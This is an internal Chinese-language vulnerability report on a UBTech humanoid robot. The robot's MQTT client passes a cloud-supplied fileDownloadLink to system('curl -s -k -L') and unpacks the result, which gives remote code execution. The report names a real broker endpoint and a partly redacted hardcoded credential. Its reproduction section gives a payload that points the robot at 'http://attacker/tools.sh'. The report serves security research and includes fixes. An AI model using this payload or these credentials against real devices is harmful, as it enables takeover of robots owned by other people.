---
编号: UBH-021
验证状态: 静态确认
严重程度: 高
披露状态: 内部研究
源平台: 优必选人型
源候选目录: mqtt-云端fileDownloadLink命令执行
---
# UBH-021 V4 · MQTT 云端 `fileDownloadLink` → `system("curl -s -k -L")` 命令执行

## 1. 一句话结论

- \| 危害 \| **严重** — 消息含 `fileDownloadLink` 即触发 `system("curl -s -k -L <url> ...")` + 自动解压 → RCE \|
- 1. 让机器人 `curl` 任意 URL（含内网 SSRF）

## 2. 影响产品与版本

- \| 组件 \| vision 板内置 MQTT 客户端（连云端 broker） \|
- ## 复现要点（授权 + 可控 broker 环境）

## 3. 验证状态

`静态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- 详见下方脱敏研究正文和材料清单。

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- \| 危害 \| **严重** — 消息含 `fileDownloadLink` 即触发 `system("curl -s -k -L <url> ...")` + 自动解压 → RCE \|
- - 任何能向该 topic 下发消息者（broker 被攻破 / 凭据泄露 / 第三方接入）即可：
- ## 红线 / 风险

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# V4 · MQTT 云端 `fileDownloadLink` → `system("curl -s -k -L")` 命令执行

| 项 | 值 |
|---|---|
| 组件 | vision 板内置 MQTT 客户端（连云端 broker） |
| 云端 broker | `upilotdev.uqirobot.com:21883` · 凭据 `uqirobot` / `<访问令牌_01>!@#` |
| 危害 | **严重** — 消息含 `fileDownloadLink` 即触发 `system("curl -s -k -L <url> ...")` + 自动解压 → RCE |
| 来源 | report_vision_core(1).md (V4) |
| 复验 | 🔒 静态确认（红线：云端交互只读，不连外部 broker 下发） |

## 漏洞原理
机器人 MQTT 客户端订阅云端 topic；收到含 `fileDownloadLink` 的消息后：
```c
system("curl -s -k -L <url> ...");   // -k 不校验 TLS, -L 跟随重定向
// 随后自动解压下载文件
```
- **硬编码凭据**登录云端 broker（可被提取用于冒充/枚举 topic）
- 任何能向该 topic 下发消息者（broker 被攻破 / 凭据泄露 / 第三方接入）即可：
  1. 让机器人 `curl` 任意 URL（含内网 SSRF）
  2. 下载 tar/zip → 自动解压 → 内含脚本则进一步执行

## 利用脚本
`scripts/exploit_mqtt.py`

- 默认（安全）：
  1. 读取设备端 `mqtt_client.json`（broker/凭据）
  2. grep 二进制中 `fileDownloadLink` / `curl -s -k -L` / topic 证据
  3. 构造恶意 MQTT 消息（`msgId / taskId / fileDownloadLink / version`）并展示
- `--danger`：提示真实下发需连外部 broker（**默认拒绝**）。

## 用法
```
python exploit_mqtt.py            # 设备侧证据 + 载荷构造
python exploit_mqtt.py --danger   # 查看下发说明（不连外网）
```

## 证据输出
- mqtt_client.json 内容（脱敏展示 broker/凭据来源）
- 二进制内下载处理证据
- 恶意消息 JSON
- `evidence/` 目录留存

## 红线 / 风险
⚠️ 连接外部 broker（upilotdev.uqirobot.com）属云端交互；下发消息会触发设备下载/执行，
**默认不做**。红线：OTA 云端 API 只读。

## 复现要点（授权 + 可控 broker 环境）
用 paho-mqtt 以 `uqirobot/<访问令牌_01>!@#` 登录，向机器人订阅 topic 下发
`{"fileDownloadLink":"http://attacker/tools.sh", ...}` → 设备执行 `curl -s -k -L`。
